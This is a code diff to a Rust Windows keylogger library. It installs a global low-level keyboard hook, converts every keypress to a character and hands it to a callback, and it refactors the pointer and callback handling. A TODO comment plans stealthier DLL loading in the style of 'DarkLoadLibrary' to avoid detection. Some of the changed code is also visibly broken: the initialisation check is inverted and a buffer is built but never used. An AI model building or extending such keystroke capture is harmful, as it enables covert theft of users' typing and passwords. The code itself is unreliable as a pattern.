@@ -7,18 +7,23 @@ extern crate alloc;
 mod api;
 mod error;
 
-use core::sync::atomic::{AtomicBool, AtomicPtr, Ordering};
+use core::{
+    char::REPLACEMENT_CHARACTER,
+    sync::atomic::{AtomicBool, AtomicPtr, Ordering},
+};
 
 use crate::api::*;
-use alloc::boxed::Box;
+use alloc::{boxed::Box, sync::Arc, vec::Vec};
 pub use error::*;
+use spin::Mutex;
 
-static mut KEYLOGGER_PTR: *const KeyLogger = core::ptr::null();
+static KEYLOGGER_PTR: AtomicPtr<KeyLogger> = AtomicPtr::new(core::ptr::null_mut());
+type BoxedCallback = Arc<Mutex<Box<dyn FnMut(char) + Send + Sync>>>;
 
 pub struct KeyLogger {
     is_logging: AtomicBool,
     hook_id: AtomicPtr<core::ffi::c_void>,
-    callback: Box<dyn Fn(char)>,
+    callback: BoxedCallback,
 }
 
 impl KeyLogger {
@@ -32,12 +37,13 @@ impl KeyLogger {
         self.hook_id.store(value, Ordering::Relaxed);
     }
 
-    fn set_callback(&mut self, value: impl Fn(char) + 'static) {
-        self.callback = Box::new(value);
+    fn set_callback(&self, value: impl FnMut(char) + Send + Sync + 'static) {
+        let mut guard = self.callback.lock();
+        *guard = Box::new(value);
     }
 
-    pub fn init() -> crate::Result<Box<Self>> {
-        if unsafe { !KEYLOGGER_PTR.is_null() } {
+    pub fn init() -> crate::Result<Arc<Self>> {
+        if KEYLOGGER_PTR.load(Ordering::SeqCst).is_null() {
             return Err(Error::KeyLoggerInitialized);
         }
         // TODO: migrate to DarkLoadLibrary implementation, potentially use LdrLoadDll in the meantime??
@@ -45,19 +51,19 @@ impl KeyLogger {
         if user32.is_null() {
             return Err(Error::WindowsError(unsafe { GetLastError() }));
         }
-        let kl_ptr = Box::new(Self {
+        let kl_ptr = Arc::new(Self {
             is_logging: AtomicBool::new(false),
             hook_id: AtomicPtr::new(core::ptr::null_mut()),
-            callback: Box::new(|_| {}),
+            callback: Arc::new(Mutex::new(Box::new(|_| {}))),
         });
-        unsafe { KEYLOGGER_PTR = &*kl_ptr };
+        KEYLOGGER_PTR.store(Arc::into_raw(kl_ptr.clone()) as *mut _, Ordering::SeqCst);
 
         Ok(kl_ptr)
     }
 
-    pub fn start_logging<F>(&mut self, callback: F) -> crate::Result<()>
+    pub fn start_logging<F>(&self, callback: F) -> crate::Result<()>
     where
-        F: Fn(char) + 'static,
+        F: FnMut(char) + Send + Sync + 'static,
     {
         let hook_id = unsafe {
             SetWindowsHookExA(
@@ -95,7 +101,7 @@ impl KeyLogger {
         #[inline]
         fn process_key(pKeyboard: &KBDLLHOOKSTRUCT) -> char {
             let (vk, sc) = (pKeyboard.vkCode, pKeyboard.scanCode);
-            let mut buffer = [0u16; 2];
+            let mut buffer = [0u16; 5];
 
             let mut keyboard_state = [0u8; 256];
             unsafe { GetKeyboardState(keyboard_state.as_mut_ptr()) };
@@ -109,21 +115,29 @@ impl KeyLogger {
                     0,
                 )
             };
-             if result > 0 {
+            if result > 0 {
                 let char_test = buffer[0] as u32;
                 if char_test == 32 {
                     return ' ';
                 } else {
-                    return core::char::from_u32(buffer[0] as u32).unwrap_or('\0');
+                    let mut vec = Vec::with_capacity(5);
+                    vec.extend_from_slice(&buffer[0..result as usize]);
+                    return core::char::decode_utf16(buffer)
+                        .map(|r| r.unwrap_or(REPLACEMENT_CHARACTER))
+                        .collect::<Vec<_>>()[0];
                 }
             }
-            '\0'
+            REPLACEMENT_CHARACTER
         }
 
         if code >= 0 && wparam == WM_KEYDOWN as usize {
             let pKeyboard = unsafe { &*(lparam as *const KBDLLHOOKSTRUCT) };
-            let cb = unsafe { &(*KEYLOGGER_PTR) };
-            (cb.callback)(process_key(pKeyboard));
+            let kl = KEYLOGGER_PTR.load(Ordering::SeqCst);
+            if !kl.is_null() {
+                let logger = unsafe { &*kl };
+                let callback = &mut logger.callback.lock();
+                (callback)(process_key(pKeyboard));
+            }
         }
         // we always need to call the next hook to allow other applications' hooks to function appropriately.
         unsafe { CallNextHookEx(core::ptr::null_mut(), code, wparam, lparam) }
